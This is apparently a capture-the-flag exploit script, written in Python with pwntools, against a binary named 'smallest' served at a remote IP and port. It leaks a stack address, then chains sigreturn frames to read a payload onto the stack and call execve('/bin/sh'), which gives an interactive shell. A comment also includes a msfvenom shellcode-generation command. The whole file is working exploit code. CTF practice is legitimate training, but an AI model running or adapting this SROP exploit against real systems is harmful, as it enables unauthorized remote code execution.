#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-19 23:10:33
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
import time
context(log_level="debug",arch="amd64")
DEBUG = 0
target = "./smallest"
remote_ip = "106.75.66.195"
port = 11006
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	# gdb.attach(p,"b*main\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	time.sleep(3)
	p.send(data)
def ru(data):
	return p.recvuntil(data)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = 0xdeadbeaf
frame.rsi = 0xdeadbeaf
frame.rdx = 0xdeadbeaf
frame.rsp = 0xdeadbeaf
frame.rip = 0x4000BE

raw_input()

# write

payload = p64(0x4000B0)+p64(0x4000B3)+p64(0x4000B0)
sd(payload)
sd("\xb3")


stack_addr = u64(p.recv(16)[8:16]) - 0x1000
print "stack_addr="+hex(stack_addr)

# frame 
# call read into stack_addr

frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0x0
frame.rsi = stack_addr
frame.rdx = 0x400
frame.rsp = stack_addr
frame.rip = 0x4000BE


payload = p64(0x4000B0)
payload +=p64(0)+str(frame)
sd(payload)

# return
payload = p64(0x4000Be)
payload += "\x00"*(15-8)
sd(payload)


#frame
# write /bin/sh



frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack_addr+0x150
frame.rsi = 0x0
frame.rdx = 0x0
frame.rsp = stack_addr
frame.rip = 0x4000Be


payload = p64(0x4000B0)
payload +=p64(0)+str(frame)
payload += "a"*(0x150-len(payload))+"/bin/sh\x00"
sd(payload)

# return
payload = p64(0x4000Be)
payload += "\x00"*(15-8)
sd(payload)

p.interactive()